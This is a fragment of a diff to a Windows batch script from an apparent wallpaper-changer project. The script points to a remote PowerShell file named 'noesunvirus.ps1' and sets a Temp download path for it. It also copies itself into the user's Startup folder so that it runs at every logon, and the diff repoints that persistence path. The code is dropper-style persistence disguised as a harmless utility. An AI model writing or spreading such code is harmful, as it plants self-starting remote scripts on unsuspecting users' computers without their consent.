@@ -3,9 +3,9 @@ setlocal enabledelayedexpansion
 
 set scriptURL=https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/noesunvirus.ps1
 set scriptPath1=%userprofile%\AppData\Local\Temp\noesunvirus.ps1
-set scriptPath2=%userprofile%\Documents\noesunvirus.ps1
-set scriptPath3=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noesunvirus.ps1
-set batchPath=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat
+::set scriptPath2=%userprofile%\Documents\noesunvirus.ps1
+::set scriptPath3=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\noesunvirus.ps1
+set batchPath=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat
 
 if not exist "%batchPath%" (
     copy "%~f0" "%batchPath%"
